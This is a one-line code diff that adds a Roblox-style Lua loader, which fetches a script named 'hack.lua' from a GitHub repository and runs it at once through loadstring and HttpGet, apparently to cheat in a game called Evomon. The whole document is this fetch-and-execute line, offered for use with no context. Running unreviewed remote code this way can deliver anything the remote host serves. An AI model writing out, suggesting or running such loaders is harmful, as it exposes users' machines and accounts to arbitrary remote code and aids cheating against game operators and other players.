@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/thimaiz/Evomon/main/hack.lua"))()
